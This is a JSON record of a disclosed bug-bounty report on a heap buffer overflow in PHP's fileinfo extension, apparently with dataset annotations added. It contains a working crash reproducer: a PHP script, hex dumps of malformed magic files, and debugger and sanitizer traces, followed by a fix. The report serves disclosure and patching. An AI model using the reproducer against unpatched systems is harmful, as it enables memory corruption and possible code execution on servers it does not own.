{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "haquaman ",
  "title": "Buffer over-write in finfo_open with malformed magic file.",
  "content": "\nhttps://bugs.php.net/bug.php?id=71527\nThis bug causes a segfault when running with environment variable USE_ZEND_ALLOC set to 0, and also when compiled with ASAN with USE_ZEND_ALLOC set and unset.\nTo reproduce, run the following PHP file, with the example magic file below.\n$ cat magic-open.php\nCode 109 Bytes\n1<?php\n2$finfo = finfo_open(FILEINFO_NONE, $argv[1]);\n3$info = finfo_file($finfo, $argv[2]);\n4var_dump($info);\n5?>\nMagic file is (used without ASAN):\n$ xxd -g 1 magic.crash-noasan\n0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e >>>>>>>>>>>>>>>>\n0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e >>>>>>>>>>>>>>>\n$ cat magic.crash-noasan\n\nMagic file is (used with ASAN):\n$ xxd -g 1 magic.crash-asan\n0000000: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e >>>>>>>>>>>>>>>>\n0000010: 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e 3e >>>>>>>>>>>>>>>>\n0000020: 71 3e 3e 3e 3e 3e 3e 3e 3e 0a 00 q>>>>>>>>..\n$ cat magic.crash-asan\nq>>>>>>>>\nThen run the program like:\n./sapi/cli/php magic-open.php magic.crash /dev/null\nYou will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is UNSET (no crash).\n$ ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\nWarning: finfo_open(): Failed to load magic database at '/root/php-src/magic.crash-noasan'. in /root/php-src/magic-open.php on line 2\nWarning: finfo_file() expects parameter 1 to be resource, boolean given in /root/php-src/magic-open.php on line 3\nbool(false)\nYou will get the following when NOT compiled with ASAN, and USE_ZEND_ALLOC is set to 0 (crash).\n$ USE_ZEND_ALLOC=0 ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\nSegmentation fault\n$ USE_ZEND_ALLOC=0 gdb --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\n\n<snip>\n(gdb) r\nStarting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\nProgram received signal SIGSEGV, Segmentation fault.\n_int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489\n3489 malloc.c: No such file or directory.\n(gdb) bt\n#0 _int_malloc (av=0x7ffff76ae760 <main_arena>, bytes=79) at malloc.c:3489\n#1 0x00007ffff73727b0 in GI_libc_malloc (bytes=79) at malloc.c:2891\n#2 0x0000000000a9fb44 in xbuf_format_converter (xbuf=xbuf@entry=0x7fffffff9d30, fmt=fmt@entry=0x1188930 \"Failed to load magic database at '%s'.\",\nap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:245\n#3 0x0000000000aa260d in vspprintf (pbuf=pbuf@entry=0x7fffffff9d90, max_len=max_len@entry=0, format=format@entry=0x1188930 \"Failed to load magic database at '%s'.\",\nap=ap@entry=0x7fffffff9e30) at /root/php-src/main/spprintf.c:821\n#4 0x0000000000a88caf in php_verror (docref=0x0, params=params@entry=0x116a24a \"\", type=type@entry=2,\nformat=format@entry=0x1188930 \"Failed to load magic database at '%s'.\", args=args@entry=0x7fffffff9e30) at /root/php-src/main/main.c:786\n#5 0x0000000000a8a644 in php_error_docref0 (docref=docref@entry=0x0, type=type@entry=2, format=format@entry=0x1188930 \"Failed to load magic database at '%s'.\")\nat /root/php-src/main/main.c:965\n#6 0x00000000006e6338 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)\nat /root/php-src/ext/fileinfo/fileinfo.c:348\n#7 0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558\n#8 0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363\n#9 0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341\n#10 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610\n#11 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994\n#12 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378\n(gdb) x/i $rip\n=> 0x7ffff736ff31 <_int_malloc+689>: mov %r14,0x10(%r9)\n(gdb) i r\nrax 0x7fffffff939f 140737488327583\nrbx 0x7ffff76ae760 140737344366432\nrcx 0x0 0\nrdx 0x7ffff76ae788 140737344366472\nrsi 0x7a0 1952\nrdi 0x7ffff76ae760 140737344366432\nrbp 0x60 0x60\nrsp 0x7fffffff9310 0x7fffffff9310\nr8 0x4 4\nr9 0x0 0\nr10 0x0 0\nr11 0x416c20 4287520\nr12 0x1878bb0 25660336\nr13 0x6 6\nr14 0x7ffff76ae7b8 140737344366520\nr15 0x2710 10000\nrip 0x7ffff736ff31 0x7ffff736ff31 <_int_malloc+689>\neflags 0x10287 [ CF PF SF IF RF ]\ncs 0x33 51\nss 0x2b 43\nds 0x0 0\nes 0x0 0\nfs 0x0 0\ngs 0x0 0\nWhen compiled WITH ASAN, and USE_ZEND_ALLOC is unset (crash).\n$ ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null\nASAN:SIGSEGV\n20824 ERROR: AddressSanitizer: SEGV on unknown address 0x00000001f168 (pc 0x000000f9d7d4 sp 0x7ffc11db3770 bp 0x000000000000 T0)\nAddressSanitizer can not provide additional info.\n#0 0xf9d7d3 in zend_mm_remove_from_free_list /root/php-src/Zend/zend_alloc.c:809\n#1 0xfa35f2 in _zend_mm_alloc_int /root/php-src/Zend/zend_alloc.c:2021\n#2 0xddffe7 in xbuf_format_converter /root/php-src/main/spprintf.c:794\n#3 0xde6b75 in vspprintf /root/php-src/main/spprintf.c:821\n#4 0xde6b75 in spprintf /root/php-src/main/spprintf.c:840\n#5 0xdc0d47 in php_verror /root/php-src/main/main.c:852\n#6 0xdc142a in php_error_docref0 /root/php-src/main/main.c:965\n#7 0x7fe8ca in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:348\n#8 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558\n#9 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363\n#10 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341\n#11 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610\n#12 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994\n#13 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378\n#14 0x7f87f6409ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n#15 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)\nSUMMARY: AddressSanitizer: SEGV /root/php-src/Zend/zend_alloc.c:809 zend_mm_remove_from_free_list\n20824 ABORTING\nAborted\nAnd compiled with ASAN and USE_ZEND_ALLOC set to 0:\n$ USE_ZEND_ALLOC=0 ./php-5.6.18-asan magic-open.php magic.crash-asan /dev/null\n20849 ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60340000cd04 at pc 0x8664d0 bp 0x7ffcc02d84b0 sp 0x7ffcc02d84a8\nWRITE of size 4 at 0x60340000cd04 thread T0\n#0 0x8664cf in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:426\n#1 0x80cd7b in parse /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520\n#2 0x80cd7b in load_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022\n#3 0x8184aa in apprentice_load /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215\n#4 0x81c6dc in apprentice_1 /root/php-src/ext/fileinfo/libmagic/apprentice.c:417\n#5 0x823594 in file_apprentice /root/php-src/ext/fileinfo/libmagic/apprentice.c:603\n#6 0x7fe571 in zif_finfo_open /root/php-src/ext/fileinfo/fileinfo.c:347\n#7 0x17f7969 in zend_do_fcall_common_helper_SPEC /root/php-src/Zend/zend_vm_execute.h:558\n#8 0x139d03d in execute_ex /root/php-src/Zend/zend_vm_execute.h:363\n#9 0x11816fa in zend_execute_scripts /root/php-src/Zend/zend.c:1341\n#10 0xdcb6f1 in php_execute_script /root/php-src/main/main.c:2610\n#11 0x1806199 in do_cli /root/php-src/sapi/cli/php_cli.c:994\n#12 0x43622f in main /root/php-src/sapi/cli/php_cli.c:1378\n#13 0x7f773df01ec4 (/lib/x86_64-linux-gnu/libc.so.6+0x21ec4)\n#14 0x4373ac in _start (/root/php-src/php-5.6.18-asan+0x4373ac)\n0x60340000cd04 is located 36 bytes to the right of 480-byte region [0x60340000cb00,0x60340000cce0)\nallocated by thread T0 here:\n#0 0x7f773e9df55f (/usr/lib/x86_64-linux-gnu/libasan.so.0+0x1555f)\n#1 0x8662ab in file_check_mem /root/php-src/ext/fileinfo/libmagic/funcs.c:418\nSUMMARY: AddressSanitizer: heap-buffer-overflow /root/php-src/ext/fileinfo/libmagic/funcs.c:429 file_check_mem\nShadow bytes around the buggy address:\n0x0c06ffff9950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n0x0c06ffff9960: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff9970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff9980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff9990: 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa\n=>0x0c06ffff99a0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n0x0c06ffff99b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff99c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff99d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff99e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n0x0c06ffff99f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\nAddressable: 00\nPartially addressable: 01 02 03 04 05 06 07\nHeap left redzone: fa\nHeap righ redzone: fb\nFreed Heap region: fd\nStack left redzone: f1\nStack mid redzone: f2\nStack right redzone: f3\nStack partial redzone: f4\nStack after return: f5\nStack use after scope: f8\nGlobal redzone: f9\nGlobal init order: f6\nPoisoned by user: f7\nASan internal: fe\n20849 ABORTING\nAborted\nRight, so those are all the possible crash states, the patch to fix is simple:\ndiff --git a/ext/fileinfo/libmagic/funcs.c b/ext/fileinfo/libmagic/funcs.c\nindex bd6d3d5..aefb95d 100644\n--- a/ext/fileinfo/libmagic/funcs.c\n+++ b/ext/fileinfo/libmagic/funcs.c\n@@ -414,7 +414,7 @@ file_check_mem(struct magic_set *ms, unsigned int level)\nsize_t len;\nif (level >= ms->c.len) {\nlen = (ms->c.len += 20) sizeof(ms->c.li);\nwhile (level >= ms->c.len) len = (ms->c.len += 20) sizeof(ms->c.li); ms->c.li = CAST(struct level_info *, (ms->c.li == NULL) ? emalloc(len) : erealloc(ms->c.li, len));\nReasoning for that patch is with these tests, level is set to either 31 (noasan test file), or 32 (asan test file), and ms->c.len is 10. Originally it added 20 to the length, then realloc'd the memory chunk, then indexed into the memory at position \"level\". This overflowed the memory, and a write occurred. This patch ensures that the memory length is over the size of level.\nYou can see this from some gdb sessions:\n$ gdb -ex 'break file_check_mem' -ex run -ex bt -ex 'p ms->c.len' -ex quit --args ./php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\n<snip>\nBreakpoint 1 at 0x7235a0: file /root/php-src/ext/fileinfo/libmagic/funcs.c, line 413.\nStarting program: /root/php-src/php-5.6.18-noasan magic-open.php magic.crash-noasan /dev/null\nBreakpoint 1, file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413\n413 {\n#0 file_check_mem (ms=ms@entry=0x1879810, level=level@entry=31) at /root/php-src/ext/fileinfo/libmagic/funcs.c:413\n#1 0x00000000006f1f3a in parse (action=<optimized out>, lineno=<optimized out>, line=0x7fffffff5bd0 '>' <repeats 31 times>, me=0x7fffffff5bc0, ms=<optimized out>)\nat /root/php-src/ext/fileinfo/libmagic/apprentice.c:1520\n#2 load_1 (ms=ms@entry=0x1879810, action=action@entry=0, fn=fn@entry=0x18779e0 \"/root/php-src/magic.crash-noasan\", errs=errs@entry=0x7fffffff7c60,\nmset=mset@entry=0x7fffffff7c70) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:1022\n#3 0x00000000006f9a03 in apprentice_load (ms=ms@entry=0x1879810, fn=fn@entry=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=action@entry=0)\nat /root/php-src/ext/fileinfo/libmagic/apprentice.c:1215\n#4 0x00000000006fdfa6 in apprentice_1 (ms=0x1879810, fn=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=0) at /root/php-src/ext/fileinfo/libmagic/apprentice.c:417\n#5 0x00000000006fffae in file_apprentice (ms=0x1879810, fn=0x18779e0 \"/root/php-src/magic.crash-noasan\", action=0)\nat /root/php-src/ext/fileinfo/libmagic/apprentice.c:603\n#6 0x0000000000725bb7 in magic_load (ms=<optimized out>, magicfile=<optimized out>) at /root/php-src/ext/fileinfo/libmagic/magic.c:267\n#7 0x00000000006e61e5 in zif_finfo_open (ht=<optimized out>, return_value=0x18779b0, return_value_ptr=<optimized out>, this_ptr=0x0, return_value_used=<optimized out>)\nat /root/php-src/ext/fileinfo/fileinfo.c:347\n#8 0x00000000010702a0 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /root/php-src/Zend/zend_vm_execute.h:558\n#9 0x0000000000e40689 in execute_ex (execute_data=0x1844f10) at /root/php-src/Zend/zend_vm_execute.h:363\n#10 0x0000000000d0409d in zend_execute_scripts (type=type@entry=8, retval=retval@entry=0x0, file_count=file_count@entry=3) at /root/php-src/Zend/zend.c:1341\n#11 0x0000000000a92d42 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd4a0) at /root/php-src/main/main.c:2610\n#12 0x000000000107b1d1 in do_cli (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:994\n#13 0x00000000004212e9 in main (argc=4, argv=0x17588a0) at /root/php-src/sapi/cli/php_cli.c:1378\n$1 = 10\nSo looking at the possible attacks, without asan, and not using zend alloc, we have a segfault in alloc, where alloc is presumably trying to determine free space from unassigned memory that we wrote to when overflowing, this causes a crash. This is backed up when we look at the stack trace of when we run with asan, and using zend_alloc, where we get a segfault in zend_mm_remove_from_free_list, which is caused by a call to ZEND_MM_CHECK_TREE with a mm_block with an invalid parent pointer.\nRunning with asan, and not using zend alloc, pinpoints the location of the buffer overwrite, to be in file_check_mem, where we patched.\nAfter the patch, there are no crashes, and you get the message the same as running without asan and with zend alloc.\nThanks for taking the time to read this report, sorry it was such a long one, just wanted to get across all the different scenarios.\n--\nUpstream bug for libmagic was reported at http://bugs.gw.com/view.php?id=522\nThis was fixed with a slightly different patch from upstream libmagic and applied to PHP\nImpact\nCan write arbitrary memory after the buffer, which leads to memory corruption and possibly remote code execution\n\n",
  "severity": [
    7.3,
    null
  ],
  "bounty": 1500,
  "weaknesses": [
    "Heap Overflow"
  ],
  "screenshots": {},
  "disclosed_date": 1604904360,
  "report_url": "https://hackerone.com/reports/476179",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a malformed magic file with repeated '>' characters (31 or 32 times)"
    ],
    [
      2,
      "Run the PHP script with the malformed magic file as input and USE_ZEND_ALLOC=0 or with ASAN enabled"
    ]
  ],
  "vuln_description": "A buffer overflow vulnerability in PHP's finfo_open function when processing a malformed magic file. The vulnerability allows writing arbitrary memory after the buffer, leading to memory corruption and potentially remote code execution. The issue occurs due to insufficient bounds checking when reallocating memory for level information in the file_check_mem function.",
  "reason": "The vulnerability requires understanding of PHP's fileinfo extension internals and memory management. While the reproduction steps are straightforward, discovering the root cause involves analyzing memory allocation patterns and understanding how malformed input can trigger buffer overflows in specific memory management configurations (with/without ASAN, with/without ZEND allocator).",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}